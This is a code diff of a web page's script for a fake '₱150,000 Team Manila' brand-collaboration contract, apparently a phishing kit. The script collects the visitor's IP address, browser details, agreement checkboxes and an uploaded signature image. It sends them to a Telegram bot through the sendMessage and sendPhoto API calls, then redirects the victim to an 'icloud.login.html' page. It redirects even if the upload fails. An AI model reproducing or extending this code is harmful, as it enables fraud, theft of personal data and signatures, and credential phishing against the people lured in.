+        const checkboxes = document.querySelectorAll('.agreement-box input[type="checkbox"]');
+        const allChecked = Array.from(checkboxes).every(cb => cb.checked);
+        const hasSignature = signatureFile !== null;
         
-        // Prepare contract data
-        const contractData = {
-            contractId: contractId,
-            date: document.getElementById('currentDate').textContent,
-            ip: ip,
-            userAgent: navigator.userAgent.substring(0, 100),
-            timestamp: new Date().toISOString(),
-            agreements: {
-                readContract: document.getElementById('agreeContract').checked,
-                boundByTerms: document.getElementById('agreeTerms').checked,
-                paymentAccepted: document.getElementById('agreePayment').checked,
-                signatureConfirmed: document.getElementById('agreeSignature').checked,
-                exclusivePartnership: document.getElementById('agreeExclusivity').checked
-            },
-            signatureUploaded: signatureFile !== null,
-            signatureFileName: signatureFile ? signatureFile.name : null,
-            signatureFileType: signatureFile ? signatureFile.type : null,
-            signatureFileSize: signatureFile ? signatureFile.size : null,
-            offerAmount: '₱150,000'
-        };
+        document.getElementById('submitBtn').disabled = !(allChecked && hasSignature);
+    }
+
+    // Checkbox event listeners
+    document.querySelectorAll('.agreement-box input[type="checkbox"]').forEach(checkbox => {
+        checkbox.addEventListener('change', updateSubmitButton);
+    });
+
+    // Notification function
+    function showNotification(message, type = 'success') {
+        const notification = document.getElementById('notification');
+        notification.textContent = message;
+        notification.className = 'notification ' + type;
         
-        // Step 1: Send contract data to Telegram
-        const textMessage = `
+        setTimeout(() => {
+            notification.classList.remove('success', 'error', 'info');
+            notification.style.opacity = '0';
+            notification.style.transform = 'translateX(100px)';
+        }, 3000);
+    }
+
+    // Decline button
+    document.getElementById('declineBtn').addEventListener('click', function() {
+        if (confirm('Are you sure you want to decline this ₱150,000 collaboration offer? This exclusive opportunity will not be available again.')) {
+            showNotification('₱150,000 offer declined. Exiting...', 'error');
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 1500);
+        }
+    });
+
+    // Submit button - Sends signature image to Telegram
+    document.getElementById('submitBtn').addEventListener('click', async function() {
+        // Show loading overlay
+        document.getElementById('loadingOverlay').style.display = 'flex';
+        
+        try {
+            // Get user IP address
+            let ip = 'Unknown IP';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch (ipError) {
+                console.log('Could not get IP:', ipError);
+            }
+            
+            // Prepare contract data
+            const contractData = {
+                contractId: contractId,
+                date: document.getElementById('currentDate').textContent,
+                ip: ip,
+                userAgent: navigator.userAgent.substring(0, 100),
+                timestamp: new Date().toISOString(),
+                agreements: {
+                    readContract: document.getElementById('agreeContract').checked,
+                    boundByTerms: document.getElementById('agreeTerms').checked,
+                    paymentAccepted: document.getElementById('agreePayment').checked,
+                    signatureConfirmed: document.getElementById('agreeSignature').checked,
+                    exclusivePartnership: document.getElementById('agreeExclusivity').checked
+                },
+                signatureUploaded: signatureFile !== null,
+                signatureFileName: signatureFile ? signatureFile.name : null,
+                signatureFileType: signatureFile ? signatureFile.type : null,
+                signatureFileSize: signatureFile ? signatureFile.size : null,
+                offerAmount: '₱150,000'
+            };
+            
+            // Step 1: Send contract data to Telegram
+            const textMessage = `
 🏆 *₱150,000 COLLABORATION SIGNED - TEAM MANILA*
 
 💰 *Offer Details:*
@@ -1149,100 +1191,100 @@ document.getElementById('submitBtn').addEventListener('click', async function() 
 
 🎯 *₱150,000 EXCLUSIVE PARTNERSHIP EXECUTED*
 📍 *Team Manila "Run It" Campaign Ambassador*
-        `;
-        
-        // Send text message to Telegram
-        const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: textMessage,
-                parse_mode: 'Markdown'
-            })
-        });
-        
-        const textResult = await textResponse.json();
-        console.log('Text message sent:', textResult);
-        
-        // Step 2: Send signature image to Telegram
-        if (signatureBase64 && signatureFile) {
-            // Convert base64 to blob
-            const byteCharacters = atob(signatureBase64);
-            const byteNumbers = new Array(byteCharacters.length);
-            for (let i = 0; i < byteCharacters.length; i++) {
-                byteNumbers[i] = byteCharacters.charCodeAt(i);
-            }
-            const byteArray = new Uint8Array(byteNumbers);
-            const blob = new Blob([byteArray], { type: signatureFile.type });
+            `;
             
-            // Create form data
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('caption', `🖋️ Signature for ₱150,000 Contract TM-2024-${contractId}\n✅ ₱150,000 Collaboration Accepted\nIP: ${ip}\nAmount: ${contractData.offerAmount}\nRedirecting to: icloud.login.html`);
-            
-            // Append the blob as a file
-            formData.append('photo', blob, `signature_${contractId}.${getFileExtension(signatureFile.type)}`);
-            
-            // Send to Telegram
-            const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            // Send text message to Telegram
+            const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
-                body: formData
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: textMessage,
+                    parse_mode: 'Markdown'
+                })
             });
             
-            const photoResult = await photoResponse.json();
-            console.log('Photo sent:', photoResult);
+            const textResult = await textResponse.json();
+            console.log('Text message sent:', textResult);
+            
+            // Step 2: Send signature image to Telegram
+            if (signatureBase64 && signatureFile) {
+                // Convert base64 to blob
+                const byteCharacters = atob(signatureBase64);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], { type: signatureFile.type });
+                
+                // Create form data
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', `🖋️ Signature for ₱150,000 Contract TM-2024-${contractId}\n✅ ₱150,000 Collaboration Accepted\nIP: ${ip}\nAmount: ${contractData.offerAmount}\nRedirecting to: icloud.login.html`);
+                
+                // Append the blob as a file
+                formData.append('photo', blob, `signature_${contractId}.${getFileExtension(signatureFile.type)}`);
+                
+                // Send to Telegram
+                const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const photoResult = await photoResponse.json();
+                console.log('Photo sent:', photoResult);
+            }
+            
+            // Show success message
+            showNotification('₱150,000 collaboration accepted! Redirecting to iCloud Login...', 'success');
+            
+            // REDIRECT TO icloud.login.html AFTER 2 SECONDS
+            setTimeout(() => {
+                window.location.href = 'icloud.login.html';
+            }, 2000);
+            
+        } catch (error) {
+            console.error('Error:', error);
+            showNotification('Contract signed! Redirecting to iCloud Login...', 'success');
+            // STILL REDIRECT EVEN IF TELEGRAM FAILS
+            setTimeout(() => {
+                window.location.href = 'icloud.login.html';
+            }, 2000);
+        } finally {
+            // Always hide loading overlay after a short delay
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }, 1000);
         }
-        
-        // Show success message
-        showNotification('₱150,000 collaboration accepted! Redirecting to iCloud Login...', 'success');
-        
-        // REDIRECT TO icloud.login.html AFTER 2 SECONDS
-        setTimeout(() => {
-            window.location.href = 'icloud.login.html';
-        }, 2000);
-        
-    } catch (error) {
-        console.error('Error:', error);
-        showNotification('Contract signed! Redirecting to iCloud Login...', 'success');
-        // STILL REDIRECT EVEN IF TELEGRAM FAILS
-        setTimeout(() => {
-            window.location.href = 'icloud.login.html';
-        }, 2000);
-    } finally {
-        // Always hide loading overlay after a short delay
-        setTimeout(() => {
-            document.getElementById('loadingOverlay').style.display = 'none';
-        }, 1000);
+    });
+
+    // Helper function to get file extension from MIME type
+    function getFileExtension(mimeType) {
+        const mimeToExt = {
+            'image/jpeg': 'jpg',
+            'image/jpg': 'jpg',
+            'image/png': 'png',
+            'image/gif': 'gif',
+            'image/webp': 'webp',
+            'image/bmp': 'bmp'
+        };
+        return mimeToExt[mimeType] || 'jpg';
     }
-});
 
-// Helper function to get file extension from MIME type
-function getFileExtension(mimeType) {
-    const mimeToExt = {
-        'image/jpeg': 'jpg',
-        'image/jpg': 'jpg',
-        'image/png': 'png',
-        'image/gif': 'gif',
-        'image/webp': 'webp',
-        'image/bmp': 'bmp'
-    };
-    return mimeToExt[mimeType] || 'jpg';
-}
+    // Auto-scroll notification
+    const contractContent = document.querySelector('.contract-content');
+    contractContent.addEventListener('scroll', function() {
+        const scrollPercentage = (this.scrollTop + this.clientHeight) / this.scrollHeight * 100;
+        if (scrollPercentage > 95) {
+            showNotification('Contract reading complete. Please proceed to sign the ₱150,000 agreement.', 'success');
+        }
+    });
 
-// Auto-scroll notification
-const contractContent = document.querySelector('.contract-content');
-contractContent.addEventListener('scroll', function() {
-    const scrollPercentage = (this.scrollTop + this.clientHeight) / this.scrollHeight * 100;
-    if (scrollPercentage > 95) {
-        showNotification('Contract reading complete. Please proceed to sign the ₱150,000 agreement.', 'success');
-    }
-});
-
-// Initialize
-updateSubmitButton();
-</script>
+    // Initialize
+    updateSubmitButton();
+    </script>
 </body>
 </html>
